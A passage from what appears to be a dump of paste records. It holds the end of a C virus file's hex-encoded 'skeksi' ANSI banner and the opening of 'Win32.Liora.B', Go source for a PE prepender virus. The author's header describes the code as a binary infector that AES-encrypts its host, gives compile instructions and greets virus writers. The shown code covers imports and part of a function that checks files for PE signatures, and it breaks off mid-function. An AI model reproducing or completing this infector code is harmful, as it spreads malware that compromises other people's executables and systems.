""\x38\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x32\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x20""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d""
""\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x20\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b""
""\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d""
""\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x30\x3b\x34\x30\x6d\x58\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d""
""\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30""
""\x6d\x20\x20\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58""
""\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x20\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3b\x3b\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x32\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x30\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x40""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x58\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30""
""\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30""
""\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x3a\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x25\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30""
""\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x3b\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x36\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b""
""\x34\x30\x6d\x3b\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x32""
""\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x33\x3b\x34\x30\x6d\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x1b\x5b\x30\x6d\x0d\x0a""
""\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x74\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d""
""\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31""
""\x3b\x33\x37\x3b\x34\x37\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30""
""\x6d\x74\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b""
""\x31\x3b\x33\x30\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x20\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x25\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x53\x53\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x37\x3b\x34\x37\x6d\x74\x2e\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20""
""\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x37\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x25\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x35\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x74""
""\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x20\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x2e\x1b\x5b\x30\x3b\x35""
""\x3b\x33\x33\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37""
""\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x3a\x1b\x5b\x30\x3b\x35\x3b\x33\x37\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x37\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33""
""\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d""
""\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30""
""\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b""
""\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d""
""\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x33\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x53\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b""
""\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b""
""\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x32\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b""
""\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x6d\x0d\x0a\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x40\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b""
""\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x53\x38\x38\x1b\x5b\x30\x3b\x33\x30\x3b\x34\x31\x6d\x38\x1b\x5b\x30\x3b""
""\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34""
""\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b""
""\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34""
""\x30\x6d\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x38\x38\x38\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30""
""\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x35\x3b\x33\x32\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31""
""\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30""
""\x3b\x35\x3b\x33\x30\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x58\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30""
""\x6d\x38\x1b\x5b\x30\x3b\x33\x31\x3b\x34\x30\x6d\x40\x1b\x5b\x30\x3b\x31\x3b\x33\x30\x3b\x34\x30\x6d\x38\x38\x1b\x5b\x30\x3b\x33""
""\x31\x3b\x34\x30\x6d\x38\x1b\x5b\x30\x6d\x0d\x0a"";

void display_skeksi(void)
{
	_write(1, (char *)skeksi_banner, sizeof(skeksi_banner));
}
"
PxQLJgpC,Win32.Liora.B - a POC PE prepender written in Go,FlyFar,Go,Sunday 18th of June 2023 10:00:43 AM CDT,"/*
* Win32.Liora.B - This is a POC PE prepender written in Go by TMZ (2015).
*
* Win32.Liora.B (May 2015) - Simple binary infector in GoLang (prepender).
* This version encrypts the host code with AES and decrypts it at runtime.
* It's almost a direct port from my GoLang ELF infector Linux.Liora, just a few tweaks.
*
* Compile with: go build -i liora.go (where go >= 1.4.2)
* It has no external dependencies so it should compile under most systems (x86 and x86_64).
*
* Use at your own risk, I'm not responsible for any damages that this may cause.
*
* A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix, R3s1stanc3 & others
*
* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
*
* http://vx.thomazi.me
 */

package main

import (
	""bufio""
	""crypto/aes""
	""crypto/cipher""
	""debug/pe""
	""encoding/binary""
	""io""
	""io/ioutil""
	""math/rand""
	""os""
	""os/exec""
	""strings""
	""time""
)

func check(e error) {
	// Reading files requires checking most calls for errors.
	// This helper will streamline our error checks below.
	if e != nil {
		panic(e)
	}
}

func _ioReader(file string) io.ReaderAt {
	r, err := os.Open(file)
	check(err)
	return r
}

func CheckPE(file string) bool {

	r := _ioReader(file)    //reader interface for file
	f, err := pe.NewFile(r) //open the file as a PE
	if err != nil {
		return false //Not a PE file
	}

	//Reading DOS header
	var dosheader [96]byte
	r.ReadAt(dosheader[0:], 0)
	if dosheader[0] == 'M' && dosheader[1] == 'Z' { //if we get MZ
		signoff := int64(binary.LittleEndian.Uint32(dosheader[0x3c:]))
		var sign [4]byte
		r.ReadAt(sign[:], signoff)
		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) { //if not PE\0\0
